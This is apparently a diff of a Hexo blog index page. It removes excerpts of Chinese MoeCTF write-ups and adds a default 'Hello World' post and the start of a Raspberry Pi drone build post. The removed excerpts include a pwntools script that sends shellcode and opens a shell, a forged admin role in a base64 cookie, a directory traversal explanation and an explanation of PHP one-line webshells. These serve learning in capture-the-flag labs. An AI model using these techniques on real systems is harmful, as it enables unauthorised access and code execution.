@@ -139,11 +139,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2023/10/05/ctfspencode/" >Misc-special encoding</a>
+			<a href="/2023/10/07/hello-world/" >Hello World</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2023-10-05  </div>
+		<div class="date">post @ 2023-10-07  </div>
 		</div>
 	</div>
 	
@@ -153,317 +153,17 @@
   <div class="row">
 	
 	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>“锟斤拷烫烫烫”明显在暗示编码错误，下载附件，发现是一种没见过的编码：<br>    +j9k-+Zi8-+T2A-+doQ-flag+&#x2F;xo-+AAo-+AAo-a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262+AAo-+AAo-+T0Y-+Zi8-flag+dSg-AES+UqA-+W8Y-+ToY-+&#x2F;ww-key+Zi8-+Tgs-+l2I-+j9k-+iEw-+W1c-+doQ-sha256+&#x2F;wg-hash+UDw-+doQ-+XwA-+WTQ-+Zi8-b34edc782d68fda34dc23329+&#x2F;wk-+AAo-+AAo-+YkA-+TuU-+i&#x2F;Q-+&#x2F;ww-codepage+dx8-+doQ-+X4g-+kc0-+iYE-+VUo-+&#x2F;wg-+AAo-</p>
-<h1 id="UTF-7解码"><a href="#UTF-7解码" class="headerlink" title="UTF-7解码"></a>UTF-7解码</h1><p>经过尝试，知道这是utf-7编码（谁丧心病狂会用这种啊），解码后有这样的信息：<br>    这是你的flag<br>    a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262<br>    但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）<br>    所以说，codepage真的很重要啊（<br>在线转换，得到key为：<br>    b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1</p>
-<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>通过aes解密后得到flag：<br><img src="/images/ctfspencodeflag.JPG"><br>(注意所有都是hex)</p>
-<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.第一次做因为不知道utf-7而卡了很久<br>2.附上一些不那么常见的编码：</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120942973">https://blog.csdn.net/q20010619/article/details/120942973</a></p>
-<p>感谢丁神的总结博客链接<br>常见编码</p>
+		<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 	
 	</div>
-  <a type="button" href="/2023/10/05/ctfspencode/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/10/05/ctfpic/" >Misc-broken picture_2</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-10-05  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>又是一张打不开的图片，但这一次“牛头不对马嘴”，先导入winhex查看：<br><img src="/images/ctfpic2.JPG"></p>
-<h1 id="png文件头"><a href="#png文件头" class="headerlink" title="png文件头"></a>png文件头</h1><p>检查发现是png的文件头：<br><img src="/images/ctfpic1.png"></p>
-<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>修改后将文件后缀改为png，打开获得flag：<br><img src="/images/ctfpicflag.png"><br>是马男波杰克！！！</p>
-<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.一开始被jpg的后缀骗了，卡了好久</p>
-
-	
-	</div>
-  <a type="button" href="/2023/10/05/ctfpic/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/10/03/pwnintof/" >PWN-Int Overflow</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-10-03  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>nc连接后回显题目信息：<br><img src="/images/pwnintof1.JPG"><br>要求我们输入一个数，要令这个数没有负号但等于-114514</p>
-<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><p>根据题目信息，可以知道变量n是整形变量，c语言中整形变量的取值范围是-2 147 483 648到 2 147 483 647，当我们输入的数超过最大值时，程序会自动回滚到最小值，比如，当我们输入2 147 483 648时，我们实际上向变量存储了-2 147 483 648这个值（就像跳绳的计数器一样），所以我们要输入-114514，只需要输入更大的数，让其回滚到-114514即可</p>
-<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>根据上面的思路，输入4 294 852 782即可：<br><img src="/images/pwnintofflag.JPG"></p>
-<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.一开始不知道int有范围限制，还能回滚，导致题目做不出来</p>
-
-	
-	</div>
-  <a type="button" href="/2023/10/03/pwnintof/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/10/03/miscpic/" >Misc-bronken picture_1</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-10-03  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目为打不开的图片，下载附件后用winhex打开：<br><img src="/images/miscpic1.JPG"><br>发现是一个图片文件，有exif信息但是无法打开</p>
-<h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>上网搜索相关信息，发现一种修改文件头的题型，检查发现图片的文件尾是jpeg图片的文件尾，但文件头经过修改，将文件头修改为jpeg的可以打开图片：<br><img src="/images/miscpic2.JPG"><br><img src="/images/miscpic3.JPG"><br>是一张西电的风景图</p>
-<h1 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h1><p>查看文件属性，发现有flag的提示：<br><img src="/images/miscpic4.JPG"><br>猜测是hex格式的flag，进行hex转字符后得到flag：<br><img src="/images/miscpicflag.JPG"></p>
-<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.第一次做做到解密flag的时候卡住了，不知道这是hex码，以后知道了<br>2.附上关于文件头隐写的知识：<br>常见文件文件头和隐写术总结 CTF中Misc必备<br>前言</p>
-<p>对常见文件文件头和隐写术做个归纳总结</p>
-<pre><code>文件头文件尾
-图片隐写
-音频隐写
-电子文档隐写
-</code></pre>
-	
-	</div>
-  <a type="button" href="/2023/10/03/miscpic/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/10/02/pwnshell0/" >PWN-shellcode_level0</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-10-02  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目直接说了是shellcode，而且可以脚本一把梭，那就试试看吧</p>
-<h1 id="检查安全性"><a href="#检查安全性" class="headerlink" title="检查安全性"></a>检查安全性</h1><p>先下载附件，放到kali里面用checksec检查一下：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec shellcode_level0 
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/pwn/MoeCTF/shellcode0/shellcode_level0'</span>
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX disabled
-    PIE:      PIE enabled
-    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>回显显示，没有任何过滤（canary found，NX disabled），可以尝试使用shellcraft构造shellcode</p>
-<h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>一把梭的脚本如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token comment"># r = process('./shellcode_level0')</span>
-r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">43039</span><span class="token punctuation">)</span>
-context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h1>
-	
-	</div>
-  <a type="button" href="/2023/10/02/pwnshell0/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/10/02/meoupload/" >Web-another upload</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-10-02  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>先来看题，很经典的一个文件上传：<br><img src="/images/meoupload1.JPG"></p>
-<h1 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h1><p>看起来没什么问题，那就先debug一下，先上传一个正常的文件，发现返回了地址，点击查看观察地址组成，发现这个地址被images.php处理过，不能直接利用：<br><img src="/images/meoupload2.JPG"><br>尝试访问一个不存在的地址，发现返回错误：<br><img src="/images/meoupload3.JPG"><br>发现有函数file_get_contents()，搜索发现，此函数可能会导致文件包含或者目录穿越，尝试发现有目录穿越漏洞，以下是关于目录穿越的知识：</p>
-<p>什么是目录遍历？</p>
-<p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件。</p>
-<p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP是一款小型的FTP客户端软件。FFFTP客户端没有正确地验证FTP服务器所返回的LIST命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的FTP服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器。</p>
-<p>漏洞原理</p>
-<p>若web要显示一个商品的图像，有时候开发者会用通过HTML加载，如：</p>
-<img src="/loadImage?filename=214.png">
-	
-	</div>
-  <a type="button" href="/2023/10/02/meoupload/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/10/01/ctfjson/" >Web-cookit and json</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-10-01  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>用浏览器访问，发现是这样，结合题目给的附件，应该是要发送json数据来得到flag：<br><img src="/images/ctfjson1.JPG"></p>
-<h1 id="思路过程"><a href="#思路过程" class="headerlink" title="思路过程"></a>思路过程</h1><p>查看附件，发现给出了&#x2F;register,&#x2F;login,&#x2F;flag等地址，判断是要我们注册用户，登录后用get请求得到flag，使用postman发送json数据，方便快捷。先试了一下附件给出的账号，注册发现用户已存在，而且登录密码也不正确，所以需要自己注册一个用户：<br><img src="/images/ctfjson1.JPG"><br><img src="/images/ctfjson2.JPG"><br><img src="/images/ctfjson3.JPG"><br>注册和登录都返回ok，但是获取flag时返回了一个假flag，并提示我们不是admin，根据题目cookie，判断问题出在cookie上，查看cookie发现有一个token，内容如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">token&#x3D;eyJ1c2VybmFtZSI6ICJodXN0bGVyIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>看着末尾的两个大等号，说明这有可能时base64，进行base64解码后的数据是这样的：</p>
-<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"hustler"</span><span class="token punctuation">,</span> <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"123456"</span><span class="token punctuation">,</span> <span class="token property">"role"</span><span class="token operator">:</span> <span class="token string">"user"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>显然，我们将role的值改为admin，即：</p>
-<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"hustler"</span><span class="token punctuation">,</span> <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"123456"</span><span class="token punctuation">,</span> <span class="token property">"role"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>再将这串数据用base64编码，得到修改后的token</p>
-	
-	</div>
-  <a type="button" href="/2023/10/01/ctfjson/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/09/29/ezup/" >Web-EZ FileUpload</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-09-29  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h1><p><img src="/images/ezup1.JPG"><br>一道经典的文件上传，看到这个思路马上就来了，就是上传一个php一句话木马，然后用蚁剑回连</p>
-<h1 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h1><p>我们先抓个包看看，这里有一个小插曲，就是如果我用127.0.0.1这个环回地址来访问，burp是抓不到包的，用局域网中的ip加端口号来访问就可以抓到包，配置好burp和浏览器的代理，先任意上传一个文件，得到如下提示：<br><img src="/images/ezup2.JPG"><br>抓包并修改文件后缀为png发现能够上传，说明这是一个前端验证，很好绕过<br>我们再次尝试，这次传一个符合要求的文件：<br><img src="/images/ezup3.JPG"><br><img src="/images/ezup4.JPG"><br>发现上传成功，并返回了一个地址，但是直接访问这个地址会返回404，根据抓包结果以及题目的hint，猜想正确地址应该只有upload以及后面的url，尝试发现可以访问。<br>那么，我们是不是只要通过抓包修改后缀绕过前端，就可以上传php木马了呢？</p>
-<h1 id="进一步尝试"><a href="#进一步尝试" class="headerlink" title="进一步尝试"></a>进一步尝试</h1><p>首先我们先构造一个一句话木马，使用文本编辑器编写，完成后将后缀改为png，下面附上一句话木马的基本知识：</p>
-<p>什么是一句话木马</p>
-<pre><code>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。
-</code></pre>
-<p>我们如何发送命令，发送的命令如何执行？</p>
-<p>我们可以通过GET 、POST 、COOKIE这三种方式向一个网站提交数据，一句话木马用$_GET[‘ ‘]、$_POST[‘ ‘]、$_COOKIE[‘ ‘] 接收我们传递的数据，并把接收的数据传递给一句话木马中执行命令的函数，进而执行命令。<br>所以看到的经典一句话木马大多都是只有两个部分，一个是可以执行代码的函数部分，一个是接收数据的部分。</p>
-	
-	</div>
-  <a type="button" href="/2023/09/29/ezup/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/09/28/moebase64/" >Reverse-base64</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-09-28  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h1><p>题目给了一个pyc文件，我们尝试在线反编译后获得源文件：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment"># Version: Python 3.7</span>
-
-<span class="token keyword">import</span> base64
-<span class="token keyword">from</span> string <span class="token keyword">import</span> <span class="token operator">*</span>
-str1 <span class="token operator">=</span> <span class="token string">'yD9oB3Inv3YAB19YynIuJnUaAGB0um0='</span>
-string1 <span class="token operator">=</span> <span class="token string">'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/'</span>
-string2 <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>
-flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'welcome to moectf\ninput your flag and I wiil check it:'</span><span class="token punctuation">)</span>
-enc_flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
-enc_flag <span class="token operator">=</span> enc_flag<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string2<span class="token punctuation">,</span> string1<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">if</span> enc_flag <span class="token operator">==</span> str1<span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'good job!!!!'</span><span class="token punctuation">)</span>
-<span class="token keyword">else</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'something wrong???'</span><span class="token punctuation">)</span>
-    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="分析加密"><a href="#分析加密" class="headerlink" title="分析加密"></a>分析加密</h1><p>审计程序逻辑发现，程序的具体逻辑是，我们输入一个字符串，然后程序对这个字符串进行base64编码，然后通过某个映射加密这组字符串，然后将这组字符串和str1对比，如果相同即为flag，所以str1这个变量即是加密后的flag，我们需要对str1进行逆向。<br>我们要反向映射str1这个字符串，查找发现，maketrans函数的作用是创建一个将string1用string2替换的映射表，而maketrans就是使用这个映射表处理字符串。那么转念一想，我们反向映射，只要将函数中string1和string2的位置交换，创建一个将string2用string1来替换的映射表，再用这个新的映射表来处理str1，不就反映射成功了吗？</p>
-<h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>说干就干，修改了以下题目的py脚本，反向映射str1，脚本如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-<span class="token keyword">from</span> string <span class="token keyword">import</span> <span class="token operator">*</span>
-str1 <span class="token operator">=</span> <span class="token string">'yD9oB3Inv3YAB19YynIuJnUaAGB0um0='</span>
-string1 <span class="token operator">=</span> <span class="token string">'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/'</span>
-string2 <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>
-f<span class="token operator">=</span>str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span>string2<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>运行得到反映射结果：<br><img src="/images/repy1.JPG"><br>再使用base64解码，得到flag：<br><img src="/images/repyflag.JPG"></p>
-<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1>
-	
-	</div>
-  <a type="button" href="/2023/09/28/moebase64/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2023/10/07/hello-world/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -498,6 +198,39 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 </div>
 
 		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/09/01/drone/" >自制树莓派无人机</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-09-01  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><p>灵感来源于watch dogs里面的黑客无人机，以树莓派+pixhawk为主体，搭载大疆F450机架，配以2000毫安锂电池，可以凭借pixhawk出色的飞控能力，以及树莓派优秀的运算能力，在空中完成近源渗透，人脸识别，数据转发（星链），无人机送货等多项功能。</p>
+<hr>
+<p>注意：建议先给pixhawk和树莓派刷入固件，调试好各项参数（根据情况可以无线调试，建议先调试完可以无线调试的项目），再组装飞机（gps，电机电调调试必须先组装好飞机），不一定要按照文章顺序来做</p>
+<hr>
+<h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><p>大概要这些<br><img src="/images/dronemt1.jpg"></p>
+<h2 id="F450机架（动力套装）"><a href="#F450机架（动力套装）" class="headerlink" title="F450机架（动力套装）"></a>F450机架（动力套装）</h2><p>如果懂得焊接可以更自由的购买电机电调来组装，不懂焊接的建议直接咸鱼（淘宝上很少或者没有组装好的）买F450的动力套装，因为动力套装插上飞控就可以操作，不需焊接，购买前请注意是否真的不需要焊接。<br><img src="/images/djijia1.jpg"><br><img src="/images/djijia2.jpg"></p>
+<h2 id="减震板"><a href="#减震板" class="headerlink" title="减震板"></a>减震板</h2>
+	
+	</div>
+  <a type="button" href="/2023/09/01/drone/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
 
 		</div>
 
@@ -507,16 +240,6 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 		<div class="pagination">
 
    
-    
-           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
-        
-
-        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
- 
-       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
-        
-
-  
 </div>
 
   		</center>
@@ -543,7 +266,7 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 			
 	<div class="category-block">
 		<h3 class="asidetitle">Categories</h3>
-			<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/">2023MoeCTF</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Misc/">Misc</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/PWN/">PWN</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Web/">Web</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/">DgutCTF</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/">Web</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/php/">php</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/unicode/">unicode</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">1</span></li></ul>
+			<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/">DgutCTF</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/">Web</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/unicode/">unicode</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">1</span></li></ul>
 	</div>
 
 
@@ -553,17 +276,11 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/Web/">Web<span>7</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/tags/Web/">Web<span>1</span></a></li>
 		
 			<li><a href="/tags/项目/">项目<span>1</span></a></li>
-		
-			<li><a href="/tags/Reverse/">Reverse<span>1</span></a></li>
-		
-			<li><a href="/tags/PWN/">PWN<span>4</span></a></li>
-		
-			<li><a href="/tags/Misc/">Misc<span>3</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>15</span></a></li>
 		
 		 
 		</ul>
@@ -577,23 +294,15 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2023/10/05/ctfspencode/" ><i class="fa fa-file-o"></i>Misc-special encoding</a>
+        <a href="/2023/10/07/hello-world/" ><i class="fa fa-file-o"></i>Hello World</a>
       </li>
     
       <li>
-        <a href="/2023/10/05/ctfpic/" ><i class="fa fa-file-o"></i>Misc-broken picture_2</a>
